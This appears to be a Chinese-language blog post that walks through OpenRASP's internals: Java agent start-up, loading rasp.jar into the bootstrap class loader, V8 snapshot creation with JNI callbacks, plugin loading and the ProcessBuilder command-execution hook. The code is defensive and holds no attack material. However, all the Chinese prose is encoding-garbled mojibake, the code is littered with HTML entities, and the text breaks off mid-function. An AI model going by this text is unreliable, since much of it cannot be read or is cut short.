å¦å¤–è¯´ç‚¹pè¯ï¼Œé¡ºä¾¿åœ¨è¿™ä¸ªè¿‡ç¨‹å½“ä¸­è¢«è¿«äº†è§£äº†ç‚¹c++è¯­æ³•çœŸæ˜¯å¤ªå¦™äº† ä¸€äº›æ—¥å¿—è¯´æ˜OpenRaspçš„æ—¥å¿—ä¼šé€šè¿‡æ–‡ä»¶çš„æ–¹å¼è®°å½•åœ¨å¯¹åº”æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œé‡Œé¢æ—¥å¿—å…·ä½“å†…å®¹å°±ä¸å¤šè§£é‡Šäº†ç‚¹å¼€ä¸€çœ¼å°±çœ‹å¾—æ‡‚ï¼Œäº†è§£ä¸‹é¢å‡ ä¸ªå…³äºæ—¥å¿—ç›®å½•ä»‹ç»å®Œå…¨è¶³å¤Ÿäº† æ–‡ä»¶å æ–‡ä»¶å†…å®¹ plugin/plugin-DATE.log æ£€æµ‹æ’ä»¶çš„æ—¥å¿—ï¼Œe.g æ’ä»¶å¼‚å¸¸ã€æ’ä»¶è°ƒè¯•è¾“å‡º rasp/rasp-DATE.log rasp agent è°ƒè¯•æ—¥å¿— alarm/alarm-DATE.log æ”»å‡»æŠ¥è­¦æ—¥å¿—ï¼ŒJSON æ ¼å¼ï¼Œä¸€è¡Œä¸€ä¸ª policy_alarm/policy_alarm-DATE.log å®‰å…¨åŸºçº¿æ£€æŸ¥æŠ¥è­¦æ—¥å¿—ï¼ŒJSON æ ¼å¼ï¼Œä¸€è¡Œä¸€ä¸ª æ­£æ–‡åˆå§‹åŒ–é¦–å…ˆæ—¢ç„¶æ˜¯ä¸€ä¸ªåŸºäºmavençš„é¡¹ç›®ï¼Œå¾ˆå¤šå…³é”®ä¿¡æ¯éƒ½è‚¯å®šæœ‰å®šä¹‰çš„ï¼Œç±»ä¼¼premain-classä»¥åŠAgent-classåˆ†åˆ«æ˜¯å¯åŠ¨æ—¶åŠ è½½å’Œå¯åŠ¨ååŠ è½½raspï¼Œè¿™é‡Œæˆ‘ä»¬å°±ä»¥premainä¸ºä¾‹å­ï¼Œå¦ä¸€ä¸ªå·®ä¸å¤šç±»ä¼¼ é¦–å…ˆæ˜¯æ‰§è¡Œinitåˆå§‹åŒ– åˆå§‹åŒ–ç¬¬ä¸€æ­¥JarFileHelper.addJarToBootstrap(inst);ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå…¶å®å°±æ˜¯æŠŠå½“å‰jaråŒ…ä¹Ÿå°±æ˜¯rasp.jaråŠ è½½è‡³Bootstrapç±»åŠ è½½å™¨ï¼Œè¿™é‡Œä½ å¯èƒ½æƒ³é—®ä¸ºä»€ä¹ˆæ˜¯æœ€é¡¶å±‚çš„è¿™ä¸ª ä¸ºä»€ä¹ˆè¦å°†rasp.jaråŠ è½½è‡³Bootstrapç±»åŠ è½½å™¨é€šè¿‡JVMçš„apiï¼ŒæŠŠå…¶è·¯å¾„è¿½åŠ åˆ°äº†å¯åŠ¨ç±»åŠ è½½å™¨çš„classpathä¸­ï¼Œè¿™æ ·ï¼Œå¯åŠ¨ç±»åŠ è½½å™¨ï¼Œæ”¶åˆ°ç±»åŠ è½½å§”æ´¾ä»»åŠ¡æ—¶ï¼Œå°±èƒ½é€šè¿‡è¯¥classpathåŠ è½½åˆ°rasp.jarçš„æ‰€æœ‰ç±»äº†ï¼Œæ ¹æ®åŒäº²å§”æ´¾ï¼Œæ„å‘³ç€ä»»ä½•ä¸€ä¸ªç±»åŠ è½½å™¨ä¸­çš„ä»»ä½•ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½é€šè¿‡æ˜¾å¼æˆ–è€…éšå¼åŠ è½½ï¼ŒåŠ è½½åˆ°rasp.jarä¸­çš„ç±»ï¼Œåè€Œç½‘ä¸Šè¯´çš„å•¥æ— æ³•hookåˆ°é€šè¿‡å¯åŠ¨ç±»åŠ è½½å™¨åŠ è½½çš„ç±»çº¯çº¯æ‰¯æ·¡ é…ç½®åˆå§‹åŒ–æ¥ä¸‹æ¥çš„readVersion()æ–¹æ³•ï¼Œå…¶å®å°±æ˜¯è¯»å–ä¸€äº›raspè‡ªèº«çš„é…ç½® 1234567891011121314public static void readVersion() throws IOException &#123; Class clazz = Agent.class; String className = clazz.getSimpleName() + &quot;.class&quot;; String classPath = clazz.getResource(className).toString(); String manifestPath = classPath.substring(0, classPath.lastIndexOf(&quot;!&quot;) + 1) + &quot;/META-INF/MANIFEST.MF&quot;; Manifest manifest = new Manifest((new URL(manifestPath)).openStream()); Attributes attr = manifest.getMainAttributes(); projectVersion = attr.getValue(&quot;Project-Version&quot;); buildTime = attr.getValue(&quot;Build-Time&quot;); gitCommit = attr.getValue(&quot;Git-Commit&quot;); projectVersion = projectVersion == null ? &quot;UNKNOWN&quot; : projectVersion; buildTime = buildTime == null ? &quot;UNKNOWN&quot; : buildTime; gitCommit = gitCommit == null ? &quot;UNKNOWN&quot; : gitCommit;&#125; æ²¡å•¥å¥½çœ‹çš„ï¼Œçœ‹çœ‹MANIFEST.MFå°±å¥½ æ¥ä¸‹æ¥æ‰§è¡ŒModuleLoader.load(mode, action, inst);æ¥ ModuleLoaderç±»åˆå§‹åŒ–é¦–å…ˆModueLoaderæœ‰ä¸ªé™æ€å—ï¼Œæ¥çœ‹çœ‹ä»£ç åšäº†ä¸¤ä»¶äº‹ï¼Œä¸€ä¸ªæ˜¯è·å–rasp.jarçš„ç»å¯¹è·¯å¾„ï¼Œå¦ä¸€ä¸ªæ˜¯è·å–æ‹“å±•ç±»åŠ è½½å™¨èµ‹å€¼ç»™moduleClassLoaderï¼Œè‡³äºä¸ºä»€ä¹ˆéœ€è¦è·å–æ‹“å±•ç±»åŠ è½½å™¨ï¼Œè¿™é‡Œå¼•å…¥ä¸‰æ¢¦å¸ˆå‚…çš„è¯ï¼Œå¾ˆå¥½ç†è§£æ²¡å•¥éš¾åº¦ 1å…¶å®ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œæ¯”å¦‚tomcatï¼Œå®ƒåœ¨è¿è¡Œä¸­ï¼Œå¤§éƒ¨åˆ†ç±»éƒ½æ˜¯ç”±å®ç°çš„åº”ç”¨ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½çš„ï¼Œé‚£ä¹ˆï¼Œå‡å¦‚Engineæ˜¯é€šè¿‡æŸä¸ªåº”ç”¨ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½çš„ï¼Œè€Œæˆ‘ä»¬çš„hookä»£ç ï¼Œåœ¨tomcatä¸­åº”ç”¨ç±»åŠ è½½å™¨åŠ è½½çš„æŸä¸ªç±»ï¼Œæ’å…¥äº†æŸæ®µä»£ç ï¼Œè¿™æ®µä»£ç ç›´æ¥ï¼ˆcom.xxx.A.a();ï¼‰è°ƒç”¨äº†Engineçš„æŸä¸ªç±»çš„æ–¹æ³•ï¼Œé‚£ä¹ˆï¼ŒæŒ‰ç…§åŒäº²å§”æ´¾æœºåˆ¶ï¼Œä»¥åŠéšå¼åŠ è½½çš„è§„èŒƒï¼Œå°†ä¼šæŠ›å‡ºClassNoFoundErrorçš„é”™è¯¯ å†ç®€å•çœ‹çœ‹ä»£ç ï¼Œå¾…ä¼šå„¿è¯´è¯´è¿™ä¸ªmoduleClassLoaderçš„ä½œç”¨ï¼Œåœ¨å¾ˆåé¢è¿™é‡Œå…ˆäº†è§£äº†è§£ 123456789101112131415161718192021222324252627282930static &#123; Class clazz; try &#123; clazz = Class.forName(&quot;java.nio.file.FileSystems&quot;); clazz.getMethod(&quot;getDefault&quot;).invoke((Object)null); &#125; catch (Throwable var4) &#123; &#125; clazz = ModuleLoader.class; String path = clazz.getResource(&quot;/&quot; + clazz.getName().replace(&quot;.&quot;, &quot;/&quot;) + &quot;.class&quot;).getPath(); if (path.startsWith(&quot;file:&quot;)) &#123; path = path.substring(5); &#125; if (path.contains(&quot;!&quot;)) &#123; path = path.substring(0, path.indexOf(&quot;!&quot;)); &#125; try &#123; baseDirectory = URLDecoder.decode((new File(path)).getParent(), &quot;UTF-8&quot;); &#125; catch (UnsupportedEncodingException var3) &#123; baseDirectory = (new File(path)).getParent(); &#125; ClassLoader systemClassLoader; for(systemClassLoader = ClassLoader.getSystemClassLoader(); systemClassLoader.getParent() != null &amp;&amp; !systemClassLoader.getClass().getName().equals(&quot;sun.misc.Launcher$ExtClassLoader&quot;); systemClassLoader = systemClassLoader.getParent()) &#123; &#125; moduleClassLoader = systemClassLoader; &#125; æ¥ä¸‹æ¥è¿›å…¥æ„é€ å‡½æ•°ï¼Œé¦–å…ˆå®ä¾‹åŒ–èµ‹å€¼engineContainer = new ModuleContainer(&quot;rasp-engine.jar&quot;); å¼•æ“å¯åŠ¨JSåˆå§‹åŒ–åœ¨com.baidu.openrasp.EngineBoot#startä¸­é¦–å…ˆé€šè¿‡Loader.load();å¼•å…¥åŠ¨æ€é“¾æ¥åº“ï¼Œå…·ä½“å¼•å…¥çš„æ˜¯å¹²å˜›çš„ä¹‹åå°±çŸ¥é“äº†ï¼Œä¹‹åæˆ‘ä»¬æš‚æ—¶å…ˆå¿½ç•¥é…ç½®ç›¸å…³çš„ä¸œè¥¿è¿›å…¥ä¸»è¦çš„ é¦–å…ˆæ˜¯JSçš„åˆå§‹åŒ– åœ¨è¿™ä¸ªè¿‡ç¨‹ï¼Œé¦–å…ˆæ˜¯è®¾ç½®æ—¥å¿—è¾“å‡ºç›¸å…³ ç´§æ¥ç€æ˜¯è®¾ç½®StackGetterï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªå›æ‰å‡½æ•°çš„è§¦å‘ è¿™ä¸€ç‚¹å¯ä»¥ä»v8çš„æ–‡æ¡£å¾—ä»¥éªŒè¯ï¼Œåé¢è¿˜ä¼šæåˆ°è¿™é‡Œåªæ˜¯ç®€å•ææ ç´§æ¥ç€æ˜¯ä¸‹é¢ä¸¤è¡Œ 12UpdatePlugin();InitFileWatcher(); ä¸€ä¸ªUpdatePlugin();ï¼Œé¦–å…ˆéå†pluginsç›®å½•ä¸‹çš„jsæ–‡ä»¶ï¼Œå¹¶æ·»åŠ åˆ°scriptså˜é‡å½“ä¸­ ç´§æ¥ç€æ‰§è¡ŒUpdatePlugin(List&lt;String[]&gt; scripts)ï¼Œé¦–å…ˆæ˜¯CreateSnapshotä»åå­—å¯ä»¥çœ‹å‡ºæ˜¯åˆ›å»ºå¿«ç…§ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ¥å…·ä½“çœ‹çœ‹å¹²äº†äº›å•¥ ç®€å•å¯¹æ–‡ä»¶åšäº†æ³¨é‡Šï¼Œå› ä¸ºæµç¨‹ç¡®å®æ²¡å•¥å¥½è¯´çš„ 1234567891011121314151617181920212223242526272829303132333435363738394041424344/* * Class: com_baidu_openrasp_v8_V8 * Method: CreateSnapshot * Signature: (Ljava/lang/String;[Ljava/lang/Object;Ljava/lang/String;)Z */ALIGN_FUNCTION JNIEXPORT jboolean JNICALL Java_com_baidu_openrasp_v8_V8_CreateSnapshot(JNIEnv* env, jclass cls, jstring jconfig, jobjectArray jplugins, jstring jversion) &#123; //global.checkPoints auto config = Jstring2String(env, jconfig); //RASPç‰ˆæœ¬ä¿¡æ¯ auto version = Jstring2String(env, jversion); std::vector&lt;PluginFile&gt; plugin_list; const size_t plugin_len = env-&gt;GetArrayLength(jplugins); //éå†pluginï¼Œå¹¶å°†æ’ä»¶æ–‡ä»¶åä¸æ’ä»¶å†…å®¹ä¿å­˜åˆ°plugin_listé‡Œé¢ for (int i = 0; i &lt; plugin_len; i++) &#123; jobjectArray plugin = (jobjectArray)env-&gt;GetObjectArrayElement(jplugins, i); if (plugin == nullptr) &#123; continue; &#125; jstring jname = (jstring)env-&gt;GetObjectArrayElement(plugin, 0); jstring jsource = (jstring)env-&gt;GetObjectArrayElement(plugin, 1); if (jname == nullptr || jsource == nullptr) &#123; continue; &#125; auto name = Jstring2String(env, jname); auto source = Jstring2String(env, jsource); plugin_list.emplace_back(name, source); &#125; auto duration = std::chrono::system_clock::now().time_since_epoch(); auto millis = std::chrono::duration_cast&lt;std::chrono::milliseconds&gt;(duration).count(); //å¥½äº†æ³¨é‡Šåˆ°ä¸Šé¢è¿™ä¸€å¨å°±ç»“æŸäº† Snapshot* blob = new Snapshot(config, plugin_list, version, millis, env); if (!blob-&gt;IsOk()) &#123; delete blob; return false; &#125; std::lock_guard&lt;std::mutex&gt; lock(snapshot_mtx); delete snapshot; snapshot = blob; return true;&#125; æ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„å‡½æ•°Snapshotï¼Œå®ƒçš„ä½œç”¨æ˜¯åˆ›å»ºä¸€ä¸ªæ„é€ å¥½çš„jsè¿è¡Œç¯å¢ƒçš„å¿«ç…§ï¼Œå®ƒç»§æ‰¿äº†StartupDataç±»ï¼Œä¸‹é¢æ˜¯æˆ‘ç®€å•åšçš„ä¸€äº›ç¬”è®° 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374Snapshot::Snapshot(const std::string&amp; config, const std::vector&lt;PluginFile&gt;&amp; plugin_list, const std::string&amp; version, uint64_t timestamp, void* custom_data) : v8::StartupData(&#123;nullptr, 0&#125;), timestamp(timestamp) &#123; IsolateData data; data.custom_data = custom_data; v8::SnapshotCreator creator(external_references); //è·å–ä¸€ä¸ªéš”ç¦»çš„ç¯å¢ƒ Isolate* isolate = reinterpret_cast&lt;Isolate*&gt;(creator.GetIsolate()); //void * åˆ™ä¸åŒï¼Œä»»ä½•ç±»å‹çš„æŒ‡é’ˆéƒ½å¯ä»¥ç›´æ¥èµ‹å€¼ç»™å®ƒï¼Œæ— éœ€è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ //ä¸Šé¢è¿™ä¸ªcustom_dataä»ä¼ é€’æ¥çœ‹ï¼Œä¼ é€’è¿‡æ¥çš„å…¶å®æ˜¯JNIENVçš„æŒ‡å‘ isolate-&gt;SetData(&amp;data); &#123; v8::Isolate::Scope isolate_scope(isolate); v8::HandleScope handle_scope(isolate); v8::Local&lt;v8::Context&gt; context = v8::Context::New(isolate); v8::Context::Scope context_scope(context); v8::TryCatch try_catch(isolate); v8::Local&lt;v8::Object&gt; global = context-&gt;Global(); //ä¸Šä¸‹æ–‡å½“ä¸­è®¾ç½®version/global/windowç­‰ä¿¡æ¯ global-&gt;Set(context, NewV8Key(isolate, &quot;version&quot;), NewV8String(isolate, version)).IsJust(); global-&gt;Set(context, NewV8Key(isolate, &quot;global&quot;), global).IsJust(); global-&gt;Set(context, NewV8Key(isolate, &quot;window&quot;), global).IsJust(); v8::Local&lt;v8::Object&gt; v8_stdout = v8::Object::New(isolate); //ä¸‹é¢éƒ½æ˜¯ç»‘å®šå‡½æ•°ï¼Œæ¯”å¦‚å°†writeç»‘å®šåˆ°å‡½æ•°external_references[0]çš„æŒ‡å‘(è¿™å˜é‡æ˜¯å•¥åé¢ä¼šè¯´åˆ°)ï¼Œå…¶ä»–ç±»ä¼¼ï¼Œå¦å¤–è¿˜æœ‰ç»‘å®šæ ‡å‡†è¾“å‡ºä¸æ ‡å‡†é”™è¯¯ v8_stdout -&gt;Set( context, NewV8Key(isolate, &quot;write&quot;), v8::Function::New(context, reinterpret_cast&lt;v8::FunctionCallback&gt;(external_references[0])).ToLocalChecked()) .IsJust(); global-&gt;Set(context, NewV8Key(isolate, &quot;stdout&quot;), v8_stdout).IsJust(); global-&gt;Set(context, NewV8Key(isolate, &quot;stderr&quot;), v8_stdout).IsJust(); global -&gt;Set( context, NewV8Key(isolate, &quot;flex_tokenize&quot;), v8::Function::New(context, reinterpret_cast&lt;v8::FunctionCallback&gt;(external_references[1])).ToLocalChecked()) .IsJust(); global -&gt;Set( context, NewV8Key(isolate, &quot;request&quot;), v8::Function::New(context, reinterpret_cast&lt;v8::FunctionCallback&gt;(external_references[2])).ToLocalChecked()) .IsJust(); global -&gt;Set( context, NewV8Key(isolate, &quot;request_async&quot;), v8::Function::New(context, reinterpret_cast&lt;v8::FunctionCallback&gt;(external_references[3])).ToLocalChecked()) .IsJust(); //æš‚æ—¶ä¸çŸ¥é“å¹²å˜›çš„ï¼Œä¹Ÿæ²¡æœ‰è¿™ä¸ªjsæ–‡ä»¶ if (isolate-&gt;ExecScript(&#123;reinterpret_cast&lt;const char*&gt;(gen_builtins), gen_builtins_len&#125;, &quot;builtins.js&quot;).IsEmpty()) &#123; Exception e(isolate, try_catch); Platform::logger(e); // no need to continue return; &#125; //åˆå§‹åŒ–é…ç½® if (isolate-&gt;ExecScript(config, &quot;config.js&quot;).IsEmpty()) &#123; Exception e(isolate, try_catch); Platform::logger(e); &#125; //æ‰§è¡Œæˆ‘ä»¬çš„æ’ä»¶jsè„šæœ¬åšå‚æ•°åˆå§‹åŒ–ä»¥åŠå„ç§æ£€æµ‹å‡½æ•°çš„æ³¨å†Œ for (auto&amp; plugin_src : plugin_list) &#123; if (isolate-&gt;ExecScript(&quot;(function()&#123;\\n&quot; + plugin_src.source + &quot;\\n&#125;)()&quot;, plugin_src.filename, -1).IsEmpty()) &#123; Exception e(isolate, try_catch); Platform::logger(e); &#125; &#125; creator.SetDefaultContext(context); &#125; v8::StartupData snapshot = creator.CreateBlob(v8::SnapshotCreator::FunctionCodeHandling::kClear); this-&gt;data = snapshot.data; this-&gt;raw_size = snapshot.raw_size;&#125; å¦å¤–ä¸Šé¢æåˆ°çš„external_referencesé‡Œé¢çš„å›æ‰å‡½æ•°åœ¨native-function.ccå½“ä¸­æœ‰å®šä¹‰ï¼Œè¿™é‡Œç›´æ¥æ”¾è¿‡æ¥å¾ˆå¥½ç†è§£å°±ä¸åšè§£é‡Šäº†ï¼Œç¨å¾®å ç‚¹ç¯‡å¹…äº† 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &quot;bundle.h&quot;#include &quot;flex/flex.h&quot;#include &quot;request.h&quot;namespace openrasp_v8 &#123;void log_callback(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123; Isolate* isolate = reinterpret_cast&lt;Isolate*&gt;(info.GetIsolate()); for (int i = 0; i &lt; info.Length(); i++) &#123; v8::String::Utf8Value message(isolate, info[i]); Platform::logger(&#123;*message, static_cast&lt;size_t&gt;(message.length())&#125;); &#125;&#125;void flex_callback(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123; Isolate* isolate = reinterpret_cast&lt;Isolate*&gt;(info.GetIsolate()); auto context = isolate-&gt;GetCurrentContext(); if (info.Length() &lt; 2 || !info[0]-&gt;IsString() || !info[1]-&gt;IsString()) &#123; return; &#125; v8::String::Utf8Value str(isolate, info[0]); v8::String::Utf8Value lexer_mode(isolate, info[1]); char* input = *str; int input_len = str.length(); flex_token_result token_result = flex_lexing(input, input_len, *lexer_mode); size_t len = std::min(uint32_t(input_len), token_result.result_len); auto arr = v8::Array::New(isolate, len); for (int i = 0; i &lt; len; i++) &#123; arr-&gt;Set(context, i, v8::Integer::New(isolate, token_result.result[i])).IsJust(); &#125; free(token_result.result); info.GetReturnValue().Set(arr);&#125;void request_callback(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123; auto isolate = info.GetIsolate(); v8::TryCatch try_catch(isolate); auto context = isolate-&gt;GetCurrentContext(); v8::Local&lt;v8::Promise::Resolver&gt; resolver; if (!v8::Promise::Resolver::New(context).ToLocal(&amp;resolver)) &#123; try_catch.ReThrow(); return; &#125; info.GetReturnValue().Set(resolver-&gt;GetPromise()); HTTPRequest req(isolate, info[0]); HTTPResponse res = req.GetResponse(); auto object = res.ToObject(isolate); if (res.error) &#123; resolver-&gt;Reject(context, object).IsJust(); &#125; else &#123; resolver-&gt;Resolve(context, object).IsJust(); &#125;&#125;void request_async_callback(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123; auto isolate = info.GetIsolate(); AsyncRequest::GetInstance().Submit(std::make_shared&lt;HTTPRequest&gt;(isolate, info[0]));&#125;intptr_t* Snapshot::external_references = new intptr_t[5]&#123; reinterpret_cast&lt;intptr_t&gt;(log_callback), reinterpret_cast&lt;intptr_t&gt;(flex_callback), reinterpret_cast&lt;intptr_t&gt;(request_callback), reinterpret_cast&lt;intptr_t&gt;(request_async_callback), 0,&#125;;&#125; // namespace openrasp_v8 ç†è§£äº†è¿™ä¸€æ®µä»¥åæ¥ä¸‹æ¥å†æ¬¡å›åˆ°Javaç«¯ è¿™é‡Œè·å¾—RASP.algorithmConfigå¹¶ä¿å­˜åˆ°ConfigItem.ALGORITHM_CONFIG åˆ°è¿™é‡Œæ’ä»¶æ›´æ–°éƒ¨åˆ†å°±ç»“æŸäº† ä¹‹åè°ƒç”¨äº†InitFileWatcher,å®ƒçš„ä½œç”¨æ˜¯åˆ›å»ºä»¥ç›®å½•ä¸ºå•ä½çš„æ–‡ä»¶ç›‘å¬ï¼Œå¦‚æœæ–‡ä»¶è¿›è¡Œå¢åˆ æ”¹ï¼Œå°±æ‰§è¡Œæ’ä»¶æ›´æ–° Checkerçš„åˆå§‹åŒ–æ¥ä¸‹æ¥å°±æ˜¯Checkerçš„åˆå§‹åŒ– è¿™é‡Œä¼šéå† éå†Typeè¿™ä¸ªæšä¸¾ç±»å‹å°†æ£€æµ‹ç±»å‹ä»¥åŠå¯¹åº”çš„æ£€æµ‹å‡½æ•°æ·»åŠ åˆ°checkersè¿™ä¸ªEnumMapå½“ä¸­ CustomClassTransformerç»§ç»­å›æ¥æ¥ä¸‹æ¥è°ƒç”¨this.initTransformer(inst);ï¼Œè¿™é‡Œå®ä¾‹åŒ–CustomClassTransformerè¿™ä¸ª Class æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œ å¯ä»¥çœ‹åˆ°å°†è‡ªèº«ä½œä¸ºç±»è½¬æ¢å™¨è¿›è¡Œæ·»åŠ  12345public CustomClassTransformer(Instrumentation inst) &#123; this.inst = inst; inst.addTransformer(this, true); this.addAnnotationHook();&#125; å¹¶è°ƒç”¨retransformï¼Œè¿™é‡Œé€»è¾‘å¾ˆç®€å•å°±ä¸å¤šè¯´ï¼Œçœ‹ä¸æ‡‚çš„å¯ä»¥è‡ªè¡Œå­¦ä¹ JavaAgent 123456789101112131415161718public void retransform() &#123; new LinkedList(); Class[] loadedClasses = this.inst.getAllLoadedClasses(); Class[] arr$ = loadedClasses; int len$ = loadedClasses.length; for(int i$ = 0; i$ &lt; len$; ++i$) &#123; Class clazz = arr$[i$]; if (this.isClassMatched(clazz.getName().replace(&quot;.&quot;, &quot;/&quot;)) &amp;&amp; this.inst.isModifiableClass(clazz) &amp;&amp; !clazz.getName().startsWith(&quot;java.lang.invoke.LambdaForm&quot;)) &#123; try &#123; this.inst.retransformClasses(new Class[]&#123;clazz&#125;); &#125; catch (Throwable var8) &#123; LogTool.error(ErrorType.HOOK_ERROR, &quot;failed to retransform class &quot; + clazz.getName() + &quot;: &quot; + var8.getMessage(), var8); &#125; &#125; &#125; &#125; å› æ­¤ä¹‹åå½“ç±»åŠ è½½çš„æ—¶å€™ï¼Œä¼šè¿›å…¥æˆ‘ä»¬è‡ªå·±çš„ Transformer ä¸­ï¼Œæ‰§è¡Œ transformå‡½æ•°è¿›è¡Œæ‹¦æˆª Hookå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬ç€é‡çœ‹com.baidu.openrasp.transformer.CustomClassTransformer#transformæ–¹æ³•ï¼Œå®ƒä¼šéå†hooksï¼Œå¦‚æœæ¡ä»¶ç¬¦åˆ(isClassMatchedè¿”å›true)åˆ™ä¼šåœ¨åˆ¶å®šçš„ç±»æ–¹æ³•å½“ä¸­è¿›è¡Œhook è€Œè¿™äº›ç±»æ¥æºäºå“ªé‡Œå‘¢ï¼Ÿå°±æ˜¯open.baidu.openrasp.hookæ–‡ä»¶å¤¹ä¸‹çš„ç±» è¿™é‡Œå‘¢æˆ‘ä»¬å°±éšä¾¿æŒ‘ä¸€ä¸ªæ¥è¿›è¡Œè§£è¯»ï¼Œé‚£å°±æ¥ä¸€ä¸ªcom.baidu.openrasp.hook.system.ProcessBuilderHookå‘½ä»¤æ‰§è¡Œçš„ç±»çš„å§ï¼Œå¯ä»¥çœ‹åˆ°isClassMatchedçš„è§„åˆ™ 123456789public boolean isClassMatched(String className) &#123; if (ModuleLoader.isModularityJdk()) &#123; return &quot;java/lang/ProcessImpl&quot;.equals(className); &#125; else if (!OSUtil.isLinux() &amp;&amp; !OSUtil.isMacOS()) &#123; return OSUtil.isWindows() ? &quot;java/lang/ProcessImpl&quot;.equals(className) : false; &#125; else &#123; return &quot;java/lang/UNIXProcess&quot;.equals(className); &#125;&#125; çœ‹çœ‹è°ƒç”¨åˆ°åº•æ˜¯å¦‚ä½•è°ƒç”¨çš„ï¼Œæˆ‘ä»¬å›åˆ°com.baidu.openrasp.transformer.CustomClassTransformer#transformï¼Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆè¿”å›çš„å­—èŠ‚ç æ˜¯å—hook.transformClasså¤„ç†çš„ï¼Œåœ¨è¿™é‡Œè¿˜æœ‰ä¸ªå°ç»†èŠ‚æ˜¯å¦‚æœloaderä¸ºnullï¼Œåˆ™ä¼šè°ƒç”¨setLoadedByBootstrapLoaderè®¾ç½®å…¶ä¸­å±æ€§ä¸ºtrueï¼Œæˆ‘ä»¬ä¹ŸçŸ¥é“ä»€ä¹ˆæƒ…å†µä¸‹è·å–ä¸åˆ°ç±»åŠ è½½å™¨ä¹Ÿå°±æ˜¯ç”±BootStrapå¯åŠ¨å™¨ç±»åŠ è½½å™¨åŠ è½½çš„ä¸€äº›ç±»å¦‚Fileã€Runtimeç­‰ç­‰ï¼Œåœ¨è®¾ç½®ä¸ºtrueä»¥ååœ¨åé¢hookçš„æ—¶å€™ç”Ÿæˆä»£ç æœ‰éƒ¨åˆ†åŒºåˆ«ï¼Œä¹‹åä¼šæåˆ° æˆ‘ä»¬å¯ä»¥çœ‹åˆ°com.baidu.openrasp.hook.AbstractClassHook#transformClassï¼Œå®ƒä¼šè°ƒç”¨å…·ä½“å®ç°ç±»çš„hookMethodæ–¹æ³• è¿™é‡Œä¹Ÿå°±æ˜¯å¯¹åº”com.baidu.openrasp.hook.system.ProcessBuilderHook#hookMethodï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„å¤„ç†ä¹Ÿæ˜¯å¾ˆå…¨é¢çš„æŒºå¥½ 12345678910111213141516protected void hookMethod(CtClass ctClass) throws IOException, CannotCompileException, NotFoundException &#123; String src; if (ctClass.getName().contains(&quot;ProcessImpl&quot;)) &#123; if (OSUtil.isWindows()) &#123; src = this.getInvokeStaticSrc(ProcessBuilderHook.class, &quot;checkCommand&quot;, &quot;$1,$2&quot;, new Class[]&#123;String[].class, String.class&#125;); this.insertBefore(ctClass, &quot;&lt;init&gt;&quot;, (String)null, src); &#125; else if (ModuleLoader.isModularityJdk()) &#123; src = this.getInvokeStaticSrc(ProcessBuilderHook.class, &quot;checkCommand&quot;, &quot;$1,$2,$4&quot;, new Class[]&#123;byte[].class, byte[].class, byte[].class&#125;); this.insertBefore(ctClass, &quot;&lt;init&gt;&quot;, (String)null, src); &#125; &#125; else if (ctClass.getName().contains(&quot;UNIXProcess&quot;)) &#123; src = this.getInvokeStaticSrc(ProcessBuilderHook.class, &quot;checkCommand&quot;, &quot;$1,$2,$4&quot;, new Class[]&#123;byte[].class, byte[].class, byte[].class&#125;); this.insertBefore(ctClass, &quot;&lt;init&gt;&quot;, (String)null, src); &#125;&#125; åœ¨å…·ä½“è¦hookçš„ç±»æ–¹æ³•å‰é¢åŠ ä¸ŠcheckCommandè¿™ä¸ªå‡½æ•° å›ç­”ä¸Šé¢é—ç•™çš„ModuleClassloaderçš„é—®é¢˜åœ¨è¿™é‡Œé€šè¿‡getInvokeStaticSrcè¿™ä¸ªæ–¹æ³•ç”Ÿæˆå…·ä½“æ’å…¥çš„ç±»ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•å½“ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå¯¹äºè¢«BootStrapåŠ è½½çš„ç±»ï¼Œå®ƒä¼šé€šè¿‡com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClasså»è°ƒç”¨æ£€æŸ¥å‘½ä»¤çš„checkCommandå‡½æ•°ï¼Œè¿™æ ·å°±é¿å…äº†ç”±äºåŒäº²å§”æ´¾æœºåˆ¶å¯¼è‡´çš„ClassNotFoundException ç”±äºé‡è½½æ€æƒ³å·®ä¸å¤šå°±éšä¾¿æŒ‘ä¸€ä¸ªçœ‹çœ‹ 1234567891011121314151617181920212223242526272829303132333435363738394041public static void checkCommand(byte[] command, byte[] args, byte[] envBlock) &#123; if ((Boolean)HookHandler.enableCmdHook.get()) &#123; LinkedList&lt;String&gt; commands = new LinkedList(); //æ‰§è¡Œçš„å‘½ä»¤ if (command != null &amp;&amp; command.length &gt; 0) &#123; commands.add(new String(command, 0, command.length - 1)); &#125; //æ‰§è¡Œçš„å‘½ä»¤çš„å‚æ•° int index; if (args != null &amp;&amp; args.length &gt; 0) &#123; int position = 0; for(index = 0; index &lt; args.length; ++index) &#123; if (args[index] == 0) &#123; commands.add(new String(Arrays.copyOfRange(args, position, index))); position = index + 1; &#125; &#125; &#125; //æ¥è‡ªenvpå‚æ•°ï¼Œé€šå¸¸ä¸ºç©ºï¼Œé€šå¸¸æ˜¯è‡ªå·±è®¾ç½®çš„ç¯å¢ƒå˜é‡ LinkedList&lt;String&gt; envList = new LinkedList(); if (envBlock != null) &#123; index = -1; for(int i = 0; i &lt; envBlock.length; ++i) &#123; if (envBlock[i] == 0) &#123; String envItem = new String(envBlock, index + 1, i - index - 1); if (envItem.length() 